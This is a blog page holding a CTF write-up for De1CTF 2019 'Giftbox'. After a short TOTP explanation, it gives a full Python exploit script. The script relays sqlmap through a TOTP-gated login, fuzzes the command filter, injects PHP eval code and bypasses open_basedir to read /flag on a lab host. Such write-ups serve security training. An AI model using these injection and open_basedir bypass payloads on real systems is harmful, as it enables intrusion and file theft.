@@ -1,0 +1,191 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[De1CTF 2019]Giftbox - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[De1CTF 2019]Giftbox
+SQL注入
+TOTP算法
+RCE
+
+12TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[De1CTF 2019]Giftbox</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[De1CTF 2019]Giftbox</h1>
+        <div class="stuff">
+            <span>七月 15, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><ul>
+<li>SQL注入</li>
+<li>TOTP算法</li>
+<li>RCE</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。</span><br><span class="line">TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</span><br></pre></td></tr></table></figure>
+
+<p>TOTP算法在main.js中可以找到，python中的totp库也可以实现相同的功能</p>
+<p>我们在界面发现需要login，所以我们子本地开一个flask，转发消息到靶机，然后对本地服务器跑sqlmap就可以获得密码,脚本在最后</p>
+<p>rce需要绕过open_basedir的限制</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># type: UnderScoreCase</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">totp = pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">retry_count = <span class="number">5</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">deep_debug = <span class="literal">False</span></span><br><span class="line">proxies = <span class="string">&#x27;http://127.0.0.1:5000&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># all printable char</span></span><br><span class="line">fuzz_char =  string.printable</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/sql/username=&lt;username&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_sql</span>(<span class="params">username</span>):</span></span><br><span class="line">    attack_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    username = urllib.unquote(username).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">    <span class="comment"># username = urllib.quote(username)</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;login admi%s admin&#x27;</span> % username,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(params)</span><br><span class="line">    r =  get(<span class="number">0</span>, attack_url, params, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line">    <span class="comment"># return &#x27;Hello World %s!&#x27; % username</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">session, url, params, proxies</span>):</span></span><br><span class="line">    retry = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                <span class="keyword">if</span> proxies:</span><br><span class="line">                    res = s.get(url, params=params, timeout=timeout, proxies=proxies)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = s.get(url, params=params, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> proxies:</span><br><span class="line">                    res = requests.get(url, params=params, proxies=proxies)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_count:</span><br><span class="line">                print(<span class="string">&#x27;timeout or server error!&#x27;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    login_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;login %s %s&#x27;</span> % (username, password),</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(params)</span><br><span class="line">    <span class="comment"># start login session=1</span></span><br><span class="line">    r = get(<span class="number">1</span>, login_url, params, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzer</span>(<span class="params">characters = fuzz_char ,position = <span class="string">&#x27;0&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&#x27;Fuzzer Start&#x27;</span>)</span><br><span class="line">    fuzz_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    available_char = []</span><br><span class="line">    available_char_ascii = [] </span><br><span class="line">    payload_params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;targeting 0 1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now() </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> fuzz_char:</span><br><span class="line">        params = payload_params.copy()</span><br><span class="line">        params[<span class="string">&#x27;a&#x27;</span>] = params[<span class="string">&#x27;a&#x27;</span>].replace(position, ch)</span><br><span class="line">        res = get(<span class="number">1</span> , fuzz_url, params, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> deep_debug:</span><br><span class="line">            print(params)</span><br><span class="line">            print(payload_params)</span><br><span class="line">            print(res.content)</span><br><span class="line">            <span class="comment"># break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;bad code&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;bad position&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;&quot;code&quot;:0&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">if</span> deep_debug:</span><br><span class="line">                print(res.content)</span><br><span class="line">            available_char.append(ch)</span><br><span class="line">            available_char_ascii.append(ord(ch))</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&#x27;Fuzz Length start...&#x27;</span>)</span><br><span class="line">        print(payload_params)</span><br><span class="line">    fuzz_length = <span class="number">0</span></span><br><span class="line">    max_len = <span class="number">30</span></span><br><span class="line">    fuzz_len = <span class="number">0</span></span><br><span class="line">    length_params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;targeting 0 1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now() </span><br><span class="line">    &#125;</span><br><span class="line">    fuzz_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> range(max_len):</span><br><span class="line">        fuzz_string = fuzz_string + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        params = length_params.copy()</span><br><span class="line">        params[<span class="string">&#x27;a&#x27;</span>] = params[<span class="string">&#x27;a&#x27;</span>].replace(position, fuzz_string)</span><br><span class="line">        res = get(<span class="number">1</span>, fuzz_url, params, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> deep_debug:</span><br><span class="line">            print(position)</span><br><span class="line">            print(params)</span><br><span class="line">            print(fuzz_string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;too long&#x27;</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            fuzz_len = count</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;payload_params:&#x27;</span>)</span><br><span class="line">    print(payload_params)</span><br><span class="line">    print(<span class="string">&#x27;Position %s  maxLength:&#x27;</span> % position)</span><br><span class="line">    print(fuzz_len + <span class="number">1</span>)</span><br><span class="line">    print(<span class="string">&#x27;Position %s Available_char:&#x27;</span> % position)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>.join(available_char))</span><br><span class="line">    print(<span class="string">&#x27;Position %s Available_char_ascii:&#x27;</span> %  position)</span><br><span class="line">    print(available_char_ascii)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&#x27;Fuzzer End&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span>():</span></span><br><span class="line">    destruct_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;destruct&#x27;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;%s&#x27;</span> % payload,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = get(<span class="number">1</span>, destruct_url, params, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&#x27;destructing.........&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;destruct params:&#x27;</span>)</span><br><span class="line">        print(params)</span><br><span class="line">        print(<span class="string">&#x27;res_content:&#x27;</span>)</span><br><span class="line">        print(res.content)</span><br><span class="line">        print(<span class="string">&#x27;destructed.............&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;missiles destructed&#x27;</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;Fail ! destruct please check!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span>(<span class="params">code, position</span>):</span></span><br><span class="line">    targeting_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;targeting %s %s&#x27;</span> % (code, position)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : payload,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = get(<span class="number">1</span>, targeting_url, params, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&#x27;params:&#x27;</span>)</span><br><span class="line">        print(params)</span><br><span class="line">        print(<span class="string">&#x27;res_code:&#x27;</span> + str(res.status_code))</span><br><span class="line">        print(<span class="string">&#x27;res_content:&#x27;</span>)</span><br><span class="line">        print(res.content)</span><br><span class="line">    <span class="keyword">if</span> res.content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;timeout or server error!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;mark&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span>():</span></span><br><span class="line">    launch_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;launch&#x27;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> : payload,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span> : totp.now(),</span><br><span class="line">        <span class="comment"># bypass open_basedir</span></span><br><span class="line">        <span class="string">&#x27;x&#x27;</span> : <span class="string">&quot;chdir(&#x27;css&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/flag&#x27;));&quot;</span></span><br><span class="line">        <span class="comment"># &#x27;x&#x27; : &#x27;phpinfo();&#x27;</span></span><br><span class="line">        <span class="comment"># &#x27;f&#x27; : &#x27;assert&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&quot;starting launch......&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;params:&#x27;</span>)</span><br><span class="line">        print(params)</span><br><span class="line">        print(<span class="string">&#x27;payload:&#x27;</span>)</span><br><span class="line">        print(payload)</span><br><span class="line">        print(<span class="string">&quot;launch end......&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get(<span class="number">1</span>, launch_url, params, <span class="number">0</span>).content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    attack_url = <span class="string">&#x27;http://3ff97f35-4a8c-4573-b710-45c430e3f7ad.node3.buuoj.cn/shell.php&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="comment"># Get password from sqlmap</span></span><br><span class="line">    password = <span class="string">&#x27;hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span></span><br><span class="line">    is_login = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;login success&#x27;</span> <span class="keyword">in</span> login(username, password).content:</span><br><span class="line">        is_login = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">&#x27;islogin:&#x27;</span>)</span><br><span class="line">            print(is_login)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;login fail!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># Solve monitor </span></span><br><span class="line">    fuzzer(fuzz_char, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    fuzzer(fuzz_char, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment"># Clean missiles</span></span><br><span class="line">    destruct()</span><br><span class="line">    <span class="comment"># Add code</span></span><br><span class="line">    targeting(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;&#123;$_GET&#123;x&#125;&#125;&#x27;</span>)</span><br><span class="line">    targeting(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;$&#123;eval($b)&#125;&#x27;</span>)</span><br><span class="line">    flag_res = launch()</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&quot;flag_response start.........&quot;</span>)</span><br><span class="line">        print(flag_res)</span><br><span class="line">        print(<span class="string">&quot;flag_response end...............&quot;</span>)</span><br><span class="line">    flag_pattern = re.compile(<span class="string">&#x27;[a-zA-Z0-9]&#123;6&#125;&#123;.*?&#125;&#x27;</span>)</span><br><span class="line">    flag_is = re.search(flag_pattern, flag_res)</span><br><span class="line">    <span class="keyword">if</span> flag_is:</span><br><span class="line">        flag = flag_is.group()</span><br><span class="line">        print(<span class="string">&quot;Get The Flag: ..................&quot;</span>)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()  <span class="comment">#开启这个之后可以sqlmap注入</span></span><br><span class="line">    <span class="comment">#get_flag()</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5967#toc-2">https://xz.aliyun.com/t/5967#toc-2</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
